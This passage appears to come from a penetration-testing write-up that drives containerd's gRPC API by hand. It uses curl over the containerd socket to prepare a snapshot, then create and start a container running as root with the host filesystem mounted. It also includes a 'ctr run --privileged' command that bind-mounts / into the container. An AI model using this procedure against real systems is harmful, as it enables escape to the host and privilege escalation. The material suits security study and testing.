* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x55faed8d7eb0)
> POST /containerd.services.snapshots.v1.Snapshots/Prepare HTTP/2
> Host: localhost
> accept: */*
> content-type: application/grpc
> user-agent: grpc-go/1.59.0
> te: trailers
> containerd-namespace: k8s.io
> content-length: 96
>
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
} [96 bytes data]
* We are completely uploaded and fine
< HTTP/2 200
< content-type: application/grpc
<
{ [453 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact
```


Now lets parse the response:

```
$ ./protobuf_parser.py -m snapshots_pb2.py -t PrepareSnapshotResponse -d preparesnapshotresponse.bin
mounts {
  type: "overlay"
  source: "overlay"
  options: "index=off"
  options: "workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/45575/work"
  options: "upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/45575/fs"
  options: "lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/290/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/289/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/288/fs"
}

```

This gives us information that we will use when we create the task.


Now we want to create a container. The [container protocol definition file](https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/services/containers/v1/containers.proto) can be used to view services relating to containers. 

The list of services provided is as follows:

```
$ ./protobuf_parser.py -m containers_pb2.py
Services:
* /containerd.services.containers.v1.Containers/Get
      Input: GetContainerRequest
      Output: GetContainerResponse
* /containerd.services.containers.v1.Containers/List
      Input: ListContainersRequest
      Output: ListContainersResponse
* /containerd.services.containers.v1.Containers/ListStream
      Input: ListContainersRequest
      Output: ListContainerMessage
* /containerd.services.containers.v1.Containers/Create
      Input: CreateContainerRequest
      Output: CreateContainerResponse
* /containerd.services.containers.v1.Containers/Update
      Input: UpdateContainerRequest
      Output: UpdateContainerResponse
* /containerd.services.containers.v1.Containers/Delete
      Input: DeleteContainerRequest
      Output: Empty
```


We use the `/containerd.services.containers.v1.Containers/Create`, which uses the `CreateContainerRequest` and `CreateContainerResponse` messages, which look like the following:

```
* CreateContainerRequest
  Fields:
      container - Container

  Rough JSON example (might need tweaking):

{
    "container": {"id": "string", "labels": "LabelsEntry", "image": "string", "runtime": "Runtime", "spec": "Any", "snapshotter": "string", "snapshot_key": "string", "created_at": "Timestamp", "updated_at": "Timestamp", "extensions": "ExtensionsEntry", "sandbox": "string"}
}

==================================
* CreateContainerResponse
  Fields:
      container - Container

  Rough JSON example (might need tweaking):

{
    "container": {"id": "string", "labels": "LabelsEntry", "image": "string", "runtime": "Runtime", "spec": "Any", "snapshotter": "string", "snapshot_key": "string", "created_at": "Timestamp", "updated_at": "Timestamp", "extensions": "ExtensionsEntry", "sandbox": "string"}
}

```

To create the container we need to put together a container definition request. These are actually pretty complex so I will break it up into seperate parts to make it easier to understand. This is the basic structure of the request with the containerspec (the most complex part) excluded. The below structure is comprised of information including `labels` taken from the `docker.io/library/nginx:1.14.2` image definition that we looked up earlier, and `snapshot` values referring to the snapshot we prepared.


```
$ cat container_template.json
{
  "container": {
    "id": "nginx",
    "labels": {
      "maintainer": "NGINX Docker Maintainers <docker-maint@nginx.com>",
      "io.cri-containerd.image": "managed",
      "io.containerd.image.config.stop-signal": "SIGTERM"
    },
    "image": "docker.io/library/nginx:1.14.2",
    "runtime": {
      "name": "io.containerd.runc.v2",
      "options": {
        "type_url": "containerd.runc.v1.Options"
      }
    },
    "spec": {
      "type_url": "types.containerd.io/opencontainers/runtime-spec/1/Spec",
      "value": "CONTAINER_SPEC_HERE" 
    },
    "snapshotter": "overlayfs",
    "snapshot_key": "nginx"
  }
}
```

The container specification, which will be insterted at the `CONTAINER_SPEC_HERE` marker, will be based on the example I have available [here](https://github.com/stephenbradshaw/pentesting_stuff/blob/master/containerd/basecontainerspec.json). This container spec will create a container running as the root user with a host filesystem, and has most of its fields set to usable values. We just need to modify the `args` and `env` items in the `process` section of the document. These will be filled in with data we take from the `docker.io/library/nginx:1.14.2` image definition, where we also obtained the `labels` data for the container structure. The values we want are from the `Env` and `Cmd` fields from the image definition.

The fields in the base template we need to fill in are at the very start of the template, and are shown in the extract below:

```
{"ociVersion": "1.1.0", "process": {"user": {"uid": 0, "gid": 0, "additionalGids": [0]}, "args": [], "env": [], "cwd": "/", "capabilities": {"bounding":
```

We want to take the following values from the image definition to 

```
"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","NGINX_VERSION=1.14.2-1~stretch","NJS_VERSION=1.14.2.0.2.6-1~stretch"],"Cmd":["nginx","-g","daemon off;"]
```

Once we have updated the `args` and the `env` fields, our completed container specification file `containerspec.json` will start like the following:

```
{"ociVersion": "1.1.0", "process": {"user": {"uid": 0, "gid": 0, "additionalGids": [0]}, "args": ["nginx", "-g", "daemon off;"], "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", "NGINX_VERSION=1.14.2-1~stretch", "NJS_VERSION=1.14.2.0.2.6-1~stretch"], "cwd": "/", "capabilities": {"bounding":
```

Lets now merge our container template `container_template.json` file together with our container spec `containerspec.json` together into a combined file `testcontainer.json` that we can then use to create a `CreateContainerRequest` message.

```
$ python -c "open('testcontainer.json', 'w').write(open('container_template.json').read().replace('\"CONTAINER_SPEC_HERE\"', open('containerspec.json').read().rstrip('\n')))"
```

Now create the binary `CreateContainerRequest` message using the JSON template we have created.

```
$ ./protobuf_parser.py -m containers_pb2.py -t CreateContainerRequest -i testcontainer.json -o createcontainerrequest.bin
Written to createcontainerrequest.bin
```

Send the request:

```
$ sudo curl -s -v --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST -H "content-type: application/grpc" -H "user-agent: grpc-go/1.59.0" -H "te: trailers" -H "containerd-namespace: k8s.io" http://localhost/containerd.services.containers.v1.Containers/Create --data-binary @createcontainerrequest.bin --output createcontainerresponse.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x556615a10a10)
> POST /containerd.services.containers.v1.Containers/Create HTTP/2
> Host: localhost
> accept: */*
> content-type: application/grpc
> user-agent: grpc-go/1.59.0
> te: trailers
> containerd-namespace: k8s.io
> content-length: 23865
>
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
} [23865 bytes data]
* We are completely uploaded and fine
< HTTP/2 200
< content-type: application/grpc
<
{ [23893 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact
```



Now we want to create a task to start the container running. The [tasks protocol definition file](https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/services/tasks/v1/tasks.proto) can be used to do this. 



```
$ ./protobuf_parser.py -m tasks_pb2.py
Services:
* /containerd.services.tasks.v1.Tasks/Create
      Input: CreateTaskRequest
      Output: CreateTaskResponse
[SNIP]
* /containerd.services.tasks.v1.Tasks/Start
      Input: StartRequest
      Output: StartResponse
[SNIP]
```


```
* CreateTaskRequest
  Fields:
      container_id - string
      rootfs - Mount
      stdin - string
      stdout - string
      stderr - string
      terminal - bool
      checkpoint - Descriptor
      options - Any
      runtime_path - string

  Rough JSON example (might need tweaking):

{
    "container_id": "string",
    "rootfs": {"type": "string", "source": "string", "target": "string", "options": "string"},
    "stdin": "string",
    "stdout": "string",
    "stderr": "string",
    "terminal": bool,
    "checkpoint": {"media_type": "string", "digest": "string", "size": "int64", "annotations": "AnnotationsEntry"},
    "options": {"type_url": "string", "value": "string"},
    "runtime_path": "string"
}

==================================
* CreateTaskResponse
  Fields:
      container_id - string
      pid - uint32

  Rough JSON example (might need tweaking):

{
    "container_id": "string",
    "pid": uint32
}

```

sudo ctr -n k8s.io run --privileged --mount 'type=bind,src=/,dst=/host,options=rbind:rw' -d 'docker.io/library/nginx:1.14.2' nginxtest




From the `PrepareSnapshotResponse` - this will time out after a period of time


`createtaskrequest.json`

```
{
    "container_id": "nginx",
    "rootfs": [
        {
            "type": "overlay",
            "source": "overlay",
            "options": [
                "index=off",
                "workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/45577/work",
                "upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/45577/fs",
                "lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/290/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/289/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/288/fs"
            ]
        }
    ],
    "stdin": "/run/containerd/fifo/3192704711/nginx-stdin",
    "stdout": "/run/containerd/fifo/3192704711/nginx-stdout",
    "stderr": "/run/containerd/fifo/3192704711/nginx-stderr"
}
```





Make the pipe files

```
$ sudo mkdir -p /run/containerd/fifo/3192704711/
$ sudo mkfifo /run/containerd/fifo/3192704711/nginx-stdin
$ sudo mkfifo /run/containerd/fifo/3192704711/nginx-stdout
$ sudo mkfifo /run/containerd/fifo/3192704711/nginx-stderr
```



```
$ ./protobuf_parser.py -m tasks_pb2.py -t CreateTaskRequest -i createtaskrequest.json -o createtaskrequest.bin
Written to createtaskrequest.bin
```




```
$ sudo curl -s -v --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST -H "content-type: application/grpc" -H "user-agent: grpc-go/1.59.0" -H "te: trailers" -H "containerd-namespace: k8s.io" http://localhost/containerd.services.tasks.v1.Tasks/Create --data-binary @createtaskrequest.bin --output createtaskresponse.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x55df28b519f0)
> POST /containerd.services.tasks.v1.Tasks/Create HTTP/2
> Host: localhost
> accept: */*
> content-type: application/grpc
> user-agent: grpc-go/1.59.0
> te: trailers
> containerd-namespace: k8s.io
> content-length: 597
>
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
} [597 bytes data]
* We are completely uploaded and fine
< HTTP/2 200
< content-type: application/grpc
<
{ [16 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact
```


When you make this request it will hang befre returning 

```
$ sudo tail -f /run/containerd/fifo/3192704711/nginx-stderr
```


```
$ sudo tail -f /run/containerd/fifo/3192704711/nginx-stdout
```


We have created the task, now we want to start it. This uses the `/containerd.services.tasks.v1.Tasks/Start` service and the `StartRequest` and `StartResponse` messages. These look like the following.

```
* StartRequest
  Fields:
      container_id - string
      exec_id - string

  Rough JSON example (might need tweaking):

{
    "container_id": "string",
    "exec_id": "string"
}

==================================
* StartResponse
  Fields:
      pid - uint32

  Rough JSON example (might need tweaking):

{
    "pid": uint32
}
```


Create a `StartRequest` request.


```
$ cat startrequest.json
{
    "container_id": "nginx"
}
$ ./protobuf_parser.py -m tasks_pb2.py -t StartRequest -i startrequest.json -o startrequest.bin
Written to startrequest.bin
```


Now send the request.

```
$ sudo curl -s -v --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST -H "content-type: application/grpc" -H "user-agent: grpc-go/1.59.0" -H "te: trailers" -H "containerd-namespace: k8s.io" http://localhost/containerd.services.tasks.v1.Tasks/Start --data-binary @startrequest.bin --output startresponse.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x562e4a2f79f0)
> POST /containerd.services.tasks.v1.Tasks/Start HTTP/2
> Host: localhost
> accept: */*
> content-type: application/grpc
> user-agent: grpc-go/1.59.0
> te: trailers
> containerd-namespace: k8s.io
> content-length: 12
>
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
} [12 bytes data]
* We are completely uploaded and fine
< HTTP/2 200
< content-type: application/grpc
<
{ [9 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact
```





```
$ ./protobuf_parser.py -m tasks_pb2.py -t StartResponse -d startresponse.bin
pid: 2084647

```


